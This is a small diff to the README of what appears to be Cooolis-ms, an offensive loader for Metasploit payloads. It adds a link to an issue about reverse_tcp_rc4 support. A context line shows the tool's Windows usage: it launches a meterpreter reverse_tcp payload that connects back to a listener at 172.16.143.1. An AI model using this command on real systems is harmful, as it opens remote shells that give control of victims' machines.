@@ -60,6 +60,8 @@ IP : 172.16.143.2
 Windows > Coolis-ms.exe -p windows/meterpreter/reverse_tcp -s LHOST=172.16.143.1,LPORT=8876 -H 172.16.143.1 -P 8899
 ```
 
+- [How to support meterpreter/reverse_tcp_rc4?](https://github.com/Rvn0xsy/Cooolis-ms/issues/6)
+
 ## Cooolis-ms server
 
 ```
